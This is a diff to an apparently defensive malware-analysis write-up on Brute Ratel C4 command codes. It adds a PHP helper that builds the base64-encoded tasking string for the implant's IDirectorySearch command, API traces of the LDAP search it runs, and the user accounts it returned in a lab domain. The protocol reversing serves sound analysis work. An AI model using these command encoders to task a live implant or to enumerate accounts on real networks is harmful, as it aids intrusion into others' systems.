@@ -7,7 +7,7 @@ date: 2025-03-28
 
 ## BRUTERATEL COMMAND LIST PART 4 
 
-updated : 10/04/2025  
+updated : 11/04/2025  
 
 ## Context  
 
@@ -51,7 +51,7 @@ Here is a short description of the next 20 command codes and purpose :
 | "\x44\x80"   | [LoadManagedCode](#LoadManagedCode) | $binary |
 | "\x56\x34   | [StartService](#StartService) | $MachineName, $ServiceName |
 | "\x8E\xB9   | [NetSessionEnum](#NetSessionEnum) | $ServerName |
-| "\x79\x75"   | [AD_Object_unknown](#AD_Object_unknown) | $p1, $p2, $p3 |
+| "\x79\x75"   | [IDirectorySearch](#IDirectorySearch) | $HostName, $SearchFilter, $AttributeNames |
 | "\x9a\xb9"   | [NetUserModalsGet](#NetUserModalsGet) | $ServerName |
 | "\x9a\xb6"   | [GetScheduledTask](#GetScheduledTask) | $serverName |
 | "\xb3\x29"   | [netshareenumlist](#netshareenumlist) | $servername |
@@ -1367,20 +1367,108 @@ function NetSessionEnum($ServerName)
 [RET] [0x227fbde028]
 ```
 
-<a id="AD_Object_unknown"></a>
-# AD_Object_unknown  
+<a id="IDirectorySearch"></a>
+# IDirectorySearch  
 
-TODO, no domain controler for dynamic suepervision
+updated : 11/04/2025  
 
 ```php
-function AD_Object_todo($p1, $p2, $p3)
+// ex: IDirectorySearch("mylab.local", "(&(objectClass=user)), "samAccountName"); 
+function IDirectorySearch($HostName, $SearchFilter, $AttributeNames)
 {
-	$cmd_id = "\x79\x75 $p1 $p2 $p3";
+	$cmd_id = "\x79\x75 $HostName $SearchFilter $AttributeNames";
 	$cmd_id_b64 = base64_encode($cmd_id);
 	
 	return $cmd_id_b64;
 }
 ```
+
+**I. Fetching the order**  
+
+```html
+[CNT] [421]
+[PTP] [0xa70] [0x938] [c:\windows\system32\rundll32.exe]
+[API] <CryptStringToBinaryA> in [crypt32.dll] 
+[PAR] LPCTSTR pszString  : 0x000000985AD278E0
+[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+cdPASPwAMgviwB++HEoW6GoZQTggosTLJ9z0IikeL8OJFxDNjvJPIrKuVNmoIpzAPK0E4YW+dM8MGrjoFrDxQ7s6ar4="
+[PAR] DWORD   cchString  : 0x0
+[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
+[PAR] BYTE    *pbBinary  : 0x000000985AD1FE10
+[PAR] DWORD   *pcbBinary : 0x000000985CCDE8EC
+[PAR] DWORD   *pdwSkip   : 0x0
+[PAR] DWORD   *pdwFlags  : 0x0
+[RET] [0x985cc3bea1]
+```
+
+**II. Execution**   
+
+```html
+[CNT] [472]
+[PTP] [0xa70] [0x91c] [c:\windows\system32\rundll32.exe]
+[API] <CoInitializeEx> in [combase.dll] 
+[RET] [0x985cc342cd]
+
+[CNT] [473]
+[PTP] [0xa70] [0x91c] [c:\windows\system32\rundll32.exe]
+[API] <ADsOpenObject> in [activeds.dll] 
+[PAR] LPCWSTR lpszPathName : 0x000000985AD3E090
+[STR]         -> "LDAP://mylab.local"
+[PAR] LPCWSTR lpszUserName : 0x0 (null)
+[PAR] LPCWSTR lpszPassword : 0x0 (null)
+[PAR] DWORD   dwReserved   : 0x1
+[PAR] REFIID  riid         : 0x000000985CC57C70 (IID_IDirectorySearch)
+[FLD]         -> iid = ({109BA8EC-92F0-11D0-A79000C04FD8D5A8})
+[PAR] void**  ppObject     : 0x000000985D25F050
+[RET] [0x985cc34659]
+
+[CNT] [475]
+[PTP] [0xa70] [0x91c] [c:\windows\system32\rundll32.exe]
+[API] <IDirectorySearch::SetSearchPreference> in [adsldp.dll] 
+[PAR] PADS_SEARCHPREF_INFO pSearchPrefs : 0x000000985D25EF60
+[PAR] DWORD                dwNumPrefs   : 0x1
+[FLD]                      -> dwSearchPref = 0x5 (ADS_SEARCHPREF_SEARCH_SCOPE)
+[FLD]                      -> vValue
+[FLD]                         -> dwType   = 0x7 (ADSTYPE_INTEGER)
+[FLD]                         -> dwStatus = 0x5ad8e9a0
+[RET] [0x985cc37e9c]
+
+[CNT] [476]
+[PTP] [0xa70] [0x91c] [c:\windows\system32\rundll32.exe]
+[API] <IDirectorySearch::ExecuteSearch> in [adsldp.dll] 
+[PAR] LPWSTR             pszSearchFilter    : 0x000000985AD40048
+[STR]                    -> "(&(objectClass=user))"
+[PAR] LPWSTR*            pAttributeNames    : 0x000000985AD40020
+[STR]                    -> pAttributeNames[0] = "samAccountName"
+[PAR] DWORD              dwNumberAttributes : 0x1
+[PAR] PADS_SEARCH_HANDLE phSearchResult     : 0x000000985D25EF58
+[RET] [0x985cc37eda]
+
+[CNT] [477]
+[PTP] [0xa70] [0x91c] [c:\windows\system32\rundll32.exe]
+[API] <IDirectorySearch::GetFirstRow> in [adsldp.dll] 
+[PAR] ADS_SEARCH_HANDLE hSearchResult : 0x000000985AD8FFE0
+[RET] [0x985cc37ef9]
+```
+
+**III. Result**   
+
+```
+7975
+sAMAccountName Administrateur|
+7975
+sAMAccountName Invit=E9|
+7975
+sAMAccountName MYDC$|
+7975
+sAMAccountName krbtgt|
+7975
+sAMAccountName eglantine|
+7975
+sAMAccountName PC-8-1$|
+7975
+sAMAccountName admin|
+```
+
 
 <a id="NetUserModalsGet"></a>
 # NetUserModalsGet  
